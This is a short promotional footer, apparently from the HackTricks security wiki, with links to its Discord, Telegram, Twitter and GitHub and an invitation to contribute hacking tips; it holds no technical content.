**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
